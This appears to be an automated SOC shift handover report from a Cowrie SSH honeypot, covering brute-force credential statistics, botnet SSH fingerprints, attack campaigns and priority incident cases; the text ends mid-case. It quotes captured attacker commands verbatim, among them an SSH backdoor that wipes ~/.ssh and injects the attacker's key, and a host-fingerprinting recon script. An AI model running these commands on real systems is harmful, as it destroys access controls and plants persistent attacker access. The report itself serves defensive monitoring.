# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-10 |
| **Generated At** | 2026-07-10T21:10:30Z |
| **Shift Time** | 21:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **393** |
| Confirmed Threats | **378** |
| False Positives Filtered | **15** (3.8%) |
| Unique Attacker IPs | **106** |
| Countries of Origin | **38** |
| High Severity Cases | **119** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **274** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **202** |
| Unique Credential Pairs | **105** |
| Unique Usernames | **38** |
| Unique Passwords | **80** |
| Successful Auth Pairs | **169** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 84 |
| `345gs5662d34` | 28 |
| `default` | 9 |
| `blank` | 6 |
| `support` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 27 |
| `1234` | 7 |
| `blank7` | 6 |
| `root2008` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 13 |
| `blank` | `blank7` | 6 |
| `root` | `root2008` | 6 |
| `root` | `1967` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Senha123` | `196.92.7.246` | 2026-07-10T18:55:13 |
| `345gs5662d34` | `345gs5662d34` | `81.192.138.65` | 2026-07-10T18:55:16 |
| `root` | `3245gs5662d34` | `196.92.7.246` | 2026-07-10T18:55:16 |
| `root` | `Pi123321` | `107.174.82.77` | 2026-07-10T18:58:56 |
| `345gs5662d34` | `345gs5662d34` | `107.174.82.77` | 2026-07-10T18:58:59 |
| `root` | `3245gs5662d34` | `107.174.82.77` | 2026-07-10T18:59:00 |
| `alex` | `password` | `45.198.224.120` | 2026-07-10T18:59:01 |
| `blank` | `blank7` | `87.117.32.22` | 2026-07-10T19:04:24 |
| `blank` | `blank7` | `125.19.244.62` | 2026-07-10T19:04:33 |
| `root` | `lb@123456` | `14.103.127.75` | 2026-07-10T19:04:33 |
| `root` | `q1w2e3!@#` | `10.0.0.73` | 2026-07-10T19:05:38 |
| `blank` | `blank7` | `27.123.113.10` | 2026-07-10T19:07:53 |
| `blank` | `blank7` | `103.250.160.76` | 2026-07-10T19:08:04 |
| `blank` | `blank7` | `10.0.0.73` | 2026-07-10T19:08:08 |
| `root` | `q1w2e3!@#` | `185.242.3.195` | 2026-07-10T19:10:16 |
| `root` | `jessica` | `45.198.224.120` | 2026-07-10T19:10:45 |
| `root` | `asasas12` | `58.56.128.190` | 2026-07-10T19:12:39 |
| `root` | `asasas12` | `93.177.157.179` | 2026-07-10T19:15:57 |
| `root` | `asasas12` | `78.187.230.168` | 2026-07-10T19:16:09 |
| `root` | `asasas12` | `10.0.0.73` | 2026-07-10T19:16:26 |
| `root` | `P@2019` | `45.198.224.120` | 2026-07-10T19:24:32 |
| `root` | `Password0` | `185.242.3.195` | 2026-07-10T19:24:56 |
| `root` | `root2008` | `59.8.50.83` | 2026-07-10T19:26:56 |
| `root` | `root2008` | `213.101.138.172` | 2026-07-10T19:27:08 |
| `default` | `default10` | `178.178.222.60` | 2026-07-10T19:29:39 |
| `root` | `root2008` | `220.124.221.144` | 2026-07-10T19:30:09 |
| `root` | `root2008` | `121.189.88.109` | 2026-07-10T19:30:20 |
| `root` | `root2008` | `10.0.0.73` | 2026-07-10T19:30:39 |
| `default` | `default10` | `118.26.153.102` | 2026-07-10T19:33:20 |
| `default` | `default10` | `10.0.0.73` | 2026-07-10T19:33:40 |
| `root` | `123123a@` | `159.65.2.17` | 2026-07-10T19:35:49 |
| `345gs5662d34` | `345gs5662d34` | `159.65.2.17` | 2026-07-10T19:35:54 |
| `root` | `3245gs5662d34` | `159.65.2.17` | 2026-07-10T19:35:55 |
| `ubnt` | `ubnt2017` | `83.239.108.218` | 2026-07-10T19:38:02 |
| `ubnt` | `ubnt2017` | `202.138.229.190` | 2026-07-10T19:38:14 |
| `root` | `pass1` | `45.198.224.120` | 2026-07-10T19:38:27 |
| `guest` | `987654321` | `45.145.203.68` | 2026-07-10T19:39:39 |
| `guest` | `987654321` | `218.21.250.151` | 2026-07-10T19:39:48 |
| `root` | `Password0` | `10.0.0.73` | 2026-07-10T19:40:17 |
| `zan` | `zan123` | `41.93.28.23` | 2026-07-10T19:41:15 |
| `345gs5662d34` | `345gs5662d34` | `41.93.28.23` | 2026-07-10T19:41:21 |
| `zan` | `3245gs5662d34` | `41.93.28.23` | 2026-07-10T19:41:23 |
| `ubnt` | `ubnt2017` | `218.146.255.221` | 2026-07-10T19:41:42 |
| `ubnt` | `ubnt2017` | `10.0.0.73` | 2026-07-10T19:42:03 |
| `guest` | `987654321` | `87.103.126.54` | 2026-07-10T19:43:16 |
| `guest` | `987654321` | `222.86.168.224` | 2026-07-10T19:43:24 |
| `root` | `\\` | `103.151.47.122` | 2026-07-10T19:44:02 |
| `345gs5662d34` | `345gs5662d34` | `103.151.47.122` | 2026-07-10T19:44:06 |
| `root` | `3245gs5662d34` | `103.151.47.122` | 2026-07-10T19:44:07 |
| `root` | `!qaz2wsx3edc` | `20.228.193.165` | 2026-07-10T19:46:59 |
| `345gs5662d34` | `345gs5662d34` | `20.228.193.165` | 2026-07-10T19:47:01 |
| `root` | `3245gs5662d34` | `20.228.193.165` | 2026-07-10T19:47:01 |
| `support` | `support` | `176.53.159.196` | 2026-07-10T19:49:00 |
| `rocky` | `password` | `10.0.0.73` | 2026-07-10T19:50:06 |
| `support` | `support` | `10.0.0.73` | 2026-07-10T19:50:22 |
| `user` | `ChangeMe` | `10.0.0.73` | 2026-07-10T19:50:57 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-10T19:51:02 |
| `user` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T19:51:05 |
| `root` | `P@ss123$` | `45.198.224.120` | 2026-07-10T19:52:25 |
| `support` | `support2014` | `10.0.0.73` | 2026-07-10T19:55:12 |
| `root` | `!@#QWEasdzxc` | `10.0.0.73` | 2026-07-10T19:55:23 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T19:55:30 |
| `root` | `123456qwerty` | `161.248.201.12` | 2026-07-10T19:55:59 |
| `345gs5662d34` | `345gs5662d34` | `161.248.201.12` | 2026-07-10T19:56:04 |
| `root` | `3245gs5662d34` | `161.248.201.12` | 2026-07-10T19:56:06 |
| `root` | `gd@123456` | `203.116.129.55` | 2026-07-10T19:57:07 |
| `345gs5662d34` | `345gs5662d34` | `203.116.129.55` | 2026-07-10T19:57:11 |
| `root` | `3245gs5662d34` | `203.116.129.55` | 2026-07-10T19:57:13 |
| `supervisor` | `3333333` | `31.173.0.26` | 2026-07-10T19:58:18 |
| `supervisor` | `3333333` | `69.126.144.30` | 2026-07-10T19:58:25 |
| `ec2-user` | `12345678` | `155.4.244.169` | 2026-07-10T19:59:04 |
| `345gs5662d34` | `345gs5662d34` | `155.4.244.169` | 2026-07-10T19:59:08 |
| `ec2-user` | `3245gs5662d34` | `155.4.244.169` | 2026-07-10T19:59:09 |
| `root` | `123456123` | `185.242.3.195` | 2026-07-10T19:59:25 |
| `postgres` | `toor` | `10.0.0.73` | 2026-07-10T19:59:37 |
| `admin` | `admin` | `159.255.34.139` | 2026-07-10T20:00:17 |
| `coba` | `coba` | `10.0.0.73` | 2026-07-10T20:00:30 |
| `roberto` | `123` | `10.0.0.73` | 2026-07-10T20:02:16 |
| `root` | `qwe123` | `102.88.137.213` | 2026-07-10T20:02:20 |
| `345gs5662d34` | `345gs5662d34` | `102.88.137.213` | 2026-07-10T20:02:23 |
| `roberto` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:02:24 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-07-10T20:02:25 |
| `root` | `Test_123` | `134.209.186.182` | 2026-07-10T20:02:27 |
| `345gs5662d34` | `345gs5662d34` | `134.209.186.182` | 2026-07-10T20:02:30 |
| `root` | `3245gs5662d34` | `134.209.186.182` | 2026-07-10T20:02:30 |
| `elasticsearch` | `elasticsearch` | `10.0.0.73` | 2026-07-10T20:03:04 |
| `elasticsearch` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:03:17 |
| `config` | `config9` | `65.20.174.49` | 2026-07-10T20:03:36 |
| `config` | `config9` | `223.197.153.143` | 2026-07-10T20:03:52 |
| `john` | `john123` | `10.0.0.73` | 2026-07-10T20:04:49 |
| `test` | `1234` | `103.67.152.201` | 2026-07-10T20:05:14 |
| `test` | `1234` | `122.166.253.226` | 2026-07-10T20:05:23 |
| `root` | `1qaz2wsx@@` | `10.0.0.73` | 2026-07-10T20:05:38 |
| `config` | `config9` | `189.56.0.19` | 2026-07-10T20:06:54 |
| `config` | `config9` | `10.0.0.73` | 2026-07-10T20:07:16 |
| `mcserver` | `password` | `10.0.0.73` | 2026-07-10T20:07:17 |
| `mcserver` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:07:30 |
| `john` | `john@123` | `10.0.0.73` | 2026-07-10T20:08:08 |
| `john` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:08:25 |
| `test` | `1234` | `202.72.196.75` | 2026-07-10T20:08:36 |
| `test` | `1234` | `65.20.179.251` | 2026-07-10T20:08:45 |
| `test` | `1234` | `10.0.0.73` | 2026-07-10T20:09:00 |
| `root` | `jack1234` | `10.0.0.73` | 2026-07-10T20:09:01 |
| `kevin` | `kevin@123` | `10.0.0.73` | 2026-07-10T20:09:48 |
| `kevin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:10:03 |
| `cloud` | `Wangsu@2017` | `10.0.0.73` | 2026-07-10T20:12:25 |
| `cloud` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:12:33 |
| `ubuntu` | `AAaa123456` | `10.0.0.73` | 2026-07-10T20:12:59 |
| `ankit` | `1234` | `10.0.0.73` | 2026-07-10T20:14:06 |
| `ankit` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:14:14 |
| `root` | `123456123` | `10.0.0.73` | 2026-07-10T20:14:43 |
| `debian` | `debian123456` | `111.70.23.254` | 2026-07-10T20:16:29 |
| `debian` | `debian123456` | `187.218.57.50` | 2026-07-10T20:19:29 |
| `debian` | `debian123456` | `103.68.22.140` | 2026-07-10T20:19:43 |
| `debian` | `debian123456` | `10.0.0.73` | 2026-07-10T20:19:55 |
| `root` | `admin_123` | `10.0.0.73` | 2026-07-10T20:20:01 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-10T20:20:23 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-10T20:20:23 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-10T20:20:29 |
| `root` | `Lr@123456` | `10.0.0.73` | 2026-07-10T20:21:42 |
| `dev` | `1qazxsw2` | `10.0.0.73` | 2026-07-10T20:22:31 |
| `dev` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:22:47 |
| `user` | `1992` | `41.65.118.172` | 2026-07-10T20:23:49 |
| `user` | `1992` | `178.178.222.55` | 2026-07-10T20:23:57 |
| `root` | `GJ123456@` | `10.0.0.73` | 2026-07-10T20:26:16 |
| `root` | `asdlkj12` | `10.0.0.73` | 2026-07-10T20:26:45 |
| `hundsun` | `hundsun` | `10.0.0.73` | 2026-07-10T20:27:42 |
| `hundsun` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:27:50 |
| `root` | `Italy123` | `10.0.0.73` | 2026-07-10T20:28:29 |
| `POST / HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.136` | 2026-07-10T20:28:48 |
| `POST /_next HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.136` | 2026-07-10T20:29:01 |
| `default` | `654321` | `144.22.210.132` | 2026-07-10T20:29:02 |
| `POST /api HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.136` | 2026-07-10T20:29:12 |
| `laravel` | `laravel` | `10.0.0.73` | 2026-07-10T20:29:21 |
| `POST /_next/server HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.136` | 2026-07-10T20:29:24 |
| `laravel` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:29:32 |
| `POST /app HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.136` | 2026-07-10T20:29:37 |
| `POST /api/route HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.136` | 2026-07-10T20:29:49 |
| `botuser` | `1111` | `10.0.0.73` | 2026-07-10T20:30:23 |
| `botuser` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T20:30:25 |
| `root` | `88888888` | `62.201.212.54` | 2026-07-10T20:30:37 |
| `root` | `88888888` | `196.188.93.169` | 2026-07-10T20:30:49 |
| `default` | `654321` | `31.41.84.98` | 2026-07-10T20:32:29 |
| `root` | `admin@123` | `185.242.3.195` | 2026-07-10T20:34:04 |
| `root` | `111111` | `92.118.39.71` | 2026-07-10T20:34:28 |
| `root` | `88888888` | `10.0.0.73` | 2026-07-10T20:34:40 |
| `ubuntu` | `qwe` | `45.198.224.120` | 2026-07-10T20:35:26 |
| `root` | `123` | `92.118.39.71` | 2026-07-10T20:36:04 |
| `root` | `123123` | `92.118.39.71` | 2026-07-10T20:37:40 |
| `root` | `123321` | `92.118.39.71` | 2026-07-10T20:39:16 |
| `root` | `1967` | `183.239.20.236` | 2026-07-10T20:40:51 |
| `root` | `1234` | `92.118.39.71` | 2026-07-10T20:40:57 |
| `root` | `1967` | `183.233.85.194` | 2026-07-10T20:41:01 |
| `root` | `12345` | `92.118.39.71` | 2026-07-10T20:42:32 |
| `root` | `1967` | `107.135.117.245` | 2026-07-10T20:44:20 |
| `root` | `1967` | `36.92.35.211` | 2026-07-10T20:44:34 |
| `root` | `1967` | `10.0.0.73` | 2026-07-10T20:44:47 |
| `root` | `1234567` | `92.118.39.71` | 2026-07-10T20:45:33 |
| `default` | `Passw@rd` | `64.72.74.162` | 2026-07-10T20:45:53 |
| `root` | `12345678` | `92.118.39.71` | 2026-07-10T20:47:02 |
| `root` | `123456789` | `92.118.39.71` | 2026-07-10T20:48:32 |
| `root` | `admin@123` | `10.0.0.73` | 2026-07-10T20:49:19 |
| `default` | `Passw@rd` | `211.23.109.116` | 2026-07-10T20:49:25 |
| `default` | `Passw@rd` | `171.217.70.151` | 2026-07-10T20:49:38 |
| `root` | `1234abcd` | `92.118.39.71` | 2026-07-10T20:50:03 |
| `root` | `123abc` | `92.118.39.71` | 2026-07-10T20:51:35 |
| `root` | `123qwe` | `92.118.39.71` | 2026-07-10T20:53:09 |
| `peter` | `peter` | `218.25.233.22` | 2026-07-10T20:54:34 |
| `root` | `1q2w3e` | `92.118.39.71` | 2026-07-10T20:54:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **393** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 49 |
| libssh | 43 |
| Go SSH scanner | 29 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 49 | 49 |
| `f555226df196...` | Mirai/variant | 33 | 12 |
| `2ec37a7cc8da...` | Mirai/variant | 14 | 1 |
| `16443846184e...` | Generic scanner | 13 | 2 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 49 | 49 | Mirai/variant |
| `f555226df196...` | libssh | 33 | 12 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 14 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 2 | 2 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 13 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 11 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `107.174.82.77`, `203.116.129.55`, `134.209.186.182`, `161.248.201.12`, `159.65.2.17`, `103.151.47.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **106** |
| Unique ASNs | **74** |
| High-Risk ASNs | **63** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (119)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c18ce3d2912d

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-07-10 18:55 |
| **Last Seen** | 2026-07-10 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:55:12` | `cowrie.session.connect` |
| `2026-07-10 18:55:12` | `cowrie.client.version` |
| `2026-07-10 18:55:12` | `cowrie.client.kex` |
| `2026-07-10 18:55:13` | `cowrie.login.success` |
| `2026-07-10 18:55:14` | `cowrie.session.params` |
| `2026-07-10 18:55:14` | `cowrie.command.input` |
| `2026-07-10 18:55:14` | `cowrie.command.failed` |
| `2026-07-10 18:55:14` | `cowrie.log.closed` |
| `2026-07-10 18:55:15` | `cowrie.session.params` |
| `2026-07-10 18:55:15` | `cowrie.command.input` |
| `2026-07-10 18:55:15` | `cowrie.session.file_download` |
| `2026-07-10 18:55:15` | `cowrie.log.closed` |
| `2026-07-10 18:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8df7a47fd1d

| Field | Detail |
|---|---|
| **Source IP** | `81.192.138[.]65` |
| **First Seen** | 2026-07-10 18:55 |
| **Last Seen** | 2026-07-10 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:55:15` | `cowrie.session.connect` |
| `2026-07-10 18:55:15` | `cowrie.client.version` |
| `2026-07-10 18:55:15` | `cowrie.client.kex` |
| `2026-07-10 18:55:16` | `cowrie.login.success` |
| `2026-07-10 18:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.138[.]65` to AbuseIPDB if not already reported
- [ ] Block `81.192.138[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb034ddf003e

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-07-10 18:55 |
| **Last Seen** | 2026-07-10 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:55:16` | `cowrie.session.connect` |
| `2026-07-10 18:55:16` | `cowrie.client.version` |
| `2026-07-10 18:55:16` | `cowrie.client.kex` |
| `2026-07-10 18:55:16` | `cowrie.login.success` |
| `2026-07-10 18:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1467e6093c95

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 18:58 |
| **Last Seen** | 2026-07-10 18:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:58:52` | `cowrie.session.connect` |
| `2026-07-10 18:58:53` | `cowrie.client.version` |
| `2026-07-10 18:58:53` | `cowrie.client.kex` |
| `2026-07-10 18:59:01` | `cowrie.login.success` |
| `2026-07-10 18:59:04` | `cowrie.session.params` |
| `2026-07-10 18:59:04` | `cowrie.command.input` |
| `2026-07-10 18:59:06` | `cowrie.log.closed` |
| `2026-07-10 18:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92aea8d4ef95

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-07-10 18:58 |
| **Last Seen** | 2026-07-10 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:58:55` | `cowrie.session.connect` |
| `2026-07-10 18:58:55` | `cowrie.client.version` |
| `2026-07-10 18:58:56` | `cowrie.client.kex` |
| `2026-07-10 18:58:56` | `cowrie.login.success` |
| `2026-07-10 18:58:58` | `cowrie.session.params` |
| `2026-07-10 18:58:58` | `cowrie.command.input` |
| `2026-07-10 18:58:58` | `cowrie.command.failed` |
| `2026-07-10 18:58:58` | `cowrie.log.closed` |
| `2026-07-10 18:58:58` | `cowrie.session.params` |
| `2026-07-10 18:58:58` | `cowrie.command.input` |
| `2026-07-10 18:58:58` | `cowrie.session.file_download` |
| `2026-07-10 18:58:58` | `cowrie.log.closed` |
| `2026-07-10 18:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a14fdd08544

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-07-10 18:58 |
| **Last Seen** | 2026-07-10 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:58:58` | `cowrie.session.connect` |
| `2026-07-10 18:58:58` | `cowrie.client.version` |
| `2026-07-10 18:58:59` | `cowrie.client.kex` |
| `2026-07-10 18:58:59` | `cowrie.login.success` |
| `2026-07-10 18:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9eb1c59ec0d

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-07-10 18:58 |
| **Last Seen** | 2026-07-10 18:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:58:59` | `cowrie.session.connect` |
| `2026-07-10 18:58:59` | `cowrie.client.version` |
| `2026-07-10 18:58:59` | `cowrie.client.kex` |
